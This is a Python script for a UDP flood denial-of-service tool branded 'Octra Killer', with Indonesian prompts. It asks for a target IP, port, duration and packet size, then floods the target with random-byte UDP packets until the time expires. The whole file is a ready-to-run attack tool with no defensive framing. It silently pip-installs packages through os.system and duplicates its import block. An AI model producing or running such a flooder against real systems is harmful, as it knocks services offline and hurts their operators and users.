import os, sys, codecs

try:
    import socks, requests, wget, cfscrape, urllib3
except:
    if sys.platform.startswith("linux"):
        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
    elif sys.platform.startswith("freebsd"):
        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
    else:
        os.system("pip install pysocks requests wget cfscrape urllib3 scapy")

import os, sys, codecs

try:
    import socks, requests, wget, cfscrape, urllib3
except:
    if sys.platform.startswith("linux"):
        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
    elif sys.platform.startswith("freebsd"):
        os.system("pip3 install pysocks requests wget cfscrape urllib3 scapy")
    else:
        os.system("pip install pysocks requests wget cfscrape urllib3 scapy")

from time import time as tt
import threading
import socket
import random

print("""\033[1;31;40m
░█████╗░░█████╗░████████╗██████╗░░█████╗░
██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗
██║░░██║██║░░╚═╝░░░██║░░░██████╔╝███████║
██║░░██║██║░░██╗░░░██║░░░██╔══██╗██╔══██║
╚█████╔╝╚█████╔╝░░░██║░░░██║░░██║██║░░██║
░╚════╝░░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝
""")
ip = str(input("\033[94m Ip target \033[1;31;40m  ====> : "))
port = int(input(" \033[94mPort Target \033[1;31;40m====> : "))
time = int(input(" \033[94mWaktu \033[1;31;40m      ====> : "))
size = int(input("\033[94m Threads \033[1;31;40m    ====> : "))

brand = """\033[32m
░█████╗░░█████╗░████████╗██████╗░░█████╗░
██╔══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗
██║░░██║██║░░╚═╝░░░██║░░░██████╔╝███████║
██║░░██║██║░░██╗░░░██║░░░██╔══██╗██╔══██║
╚█████╔╝╚█████╔╝░░░██║░░░██║░░██║██║░░██║
░╚════╝░░╚════╝░░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝
"""

os.system("clear")
def attack(ip, port, time, size):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(65535, port))
    print(brand)
    print("\033[95m=+=+=+=+ Octra Killer Launched! +=+=+=+=")
    fmt = '\033[91m  Octra Attacking To {ip} {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    size = os.urandom(min(666, size))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or random.randint(1, 65535)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(size, (ip, port))

    print('\033[92mAttack Finished')

if __name__ == '__main__':
    try:
        attack(ip, port, time, size)
    except KeyboardInterrupt:
        print('Attack stopped.')